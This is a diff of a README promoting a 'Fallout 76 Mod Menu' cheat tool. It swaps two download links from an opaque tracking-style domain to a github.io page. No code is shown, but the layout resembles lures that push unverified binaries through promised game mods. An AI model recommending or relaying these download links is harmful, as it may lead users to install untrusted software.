@@ -2,7 +2,7 @@
 
 **Fallout 76 Mod Menu** is a feature-rich modification toolkit designed to enhance and customize your experience in Bethesda's online RPG, *Fallout 76*. This mod menu gives players access to a variety of in-game tweaks, visual enhancements, and gameplay tools, allowing for a more flexible, personalized, and enjoyable Wasteland adventure.
 
-[![Download Fallout76 ModMenu](https://img.shields.io/badge/Download-Fallout76%20ModMenu-blueviolet)](https://verqcloud.com?label=09c0d50b1ab5e4e1d163f9d9c8344a8a)
+[![Download Fallout76 ModMenu](https://img.shields.io/badge/Download-Fallout76%20ModMenu-blueviolet)](https://fallout-76-mod-menu.github.io/.github/)
 
 ## ✨ Features
 
@@ -22,4 +22,4 @@
 4. In-game, press the configured hotkey (e.g., `F7`) to open the mod menu.
 5. Toggle features and settings as needed.
 
-[![Download Fallout76 ModMenu](https://img.shields.io/badge/Download-Fallout76%20ModMenu-blueviolet)](https://verqcloud.com?label=09c0d50b1ab5e4e1d163f9d9c8344a8a)
+[![Download Fallout76 ModMenu](https://img.shields.io/badge/Download-Fallout76%20ModMenu-blueviolet)](https://fallout-76-mod-menu.github.io/.github/)
